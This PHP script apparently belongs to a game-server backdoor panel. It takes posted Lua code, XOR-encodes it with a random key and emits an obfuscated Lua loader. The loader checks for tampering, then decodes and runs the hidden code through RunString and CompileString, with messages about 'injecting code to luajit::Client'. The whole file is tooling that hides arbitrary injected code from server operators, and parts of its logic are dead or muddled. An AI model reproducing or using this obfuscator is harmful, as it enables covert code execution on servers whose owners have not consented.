<?php
include('../class/include.php');
if (!Account::isAuthentified() || !CSRF::isAjaxRequest())
{
    die("Bad request");
}

function generateRandomKey($length = 4) {
    $characters = '123456789';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

$auto_key = generateRandomKey();

$random_string_len = 15;
$line_break = false;


$code = str_replace("<NEWLINE>", "\n", $_POST['code']);

foreach (str_split($code) as $char) {
    $e = ord($char);
    $endtbl .= ($e ^ $auto_key) . ",";
}

$obfukey = 108;

    $code = $_POST["coding"];

    if(preg_match("#{#", $_POST["coding"])){
        $code = explode('{', $code);
        $code = $code[1];
    }
    if(preg_match("#}#", $_POST["coding"])){
        $code = explode('}', $code);
        $code = $code[0];
    }

    if(preg_match("#RunningDuck#", $_POST["coding"])){
        $obfukey = $auto_key;
    }
    if(preg_match("#OMEGA#", $_POST["coding"])){
        $obfukey = $auto_key;
    }    $encodetbl = $code;


    $str_cut = explode(',', $encodetbl);

    foreach ($str_cut as $deobfusque) {
        $x= $deobfusque;
        $y=$obfukey;
    }

$endtbl .= "0}";
?>
RunString([==[
enccodetbl = {<?php echo $endtbl; ?>
function RunHASHOb()
    if not (debug.getinfo(function()end).short_src == "SDATA") then
        CompileString("print('Bad source')", "error",true)()
        return
    end
    for o=500,10000 do
        if o ~= string.len(string.dump(RunHASHOb)) then
            SDATA_DATA_CACHE = 10
            CompileString("for i=1,40 do SDATA_DATA_CACHE = SDATA_DATA_CACHE + 1 end", "RunString")()
            if SDATA_DATA_CACHE < 40 then
                for i=1,100 do
                    CompileString("print('Oops, seem like you have broken this file')","Oops")()
                end
                return
            end
            continue
        else
            xpcall(function()
                pdata = ""
                xpcall(function()
                    for i=1,string.len(string.dump(string.char)) do
                        while o == i do
                            o = o + 100000
                        end
                    end
                end,function() PJDATA_SUB = false end)
                if PJDATA_SUB then print("Error while ceating payload to inject") return end
                for i=1,#enccodetbl do
                    pdata=pdata.. string.char(bit.bxor(enccodetbl[i], <?php echo $auto_key; ?>))
                end
                if debug.getinfo(RunString).what ~= "C" then return end
                PJDATA_SUB = true
                for i=1,string.len(string.dump(CompileString)) do
                    while o == 1050401 do
                        o = o + 4510
                    end
                end
            end,function()
                xpcall(function()
                    local debug_inject = CompileString(pdata,"0:FFFFFFFF")
                    pcall(debug_inject,"LUA_STAT_CLIENT")
                    pdata = "\00"
                end,function()
                    print("Error while injecting code to luajit::Client")
                end)
            end)
        end
    end
end
pcall(RunHASHOb)
]==],"SDATA")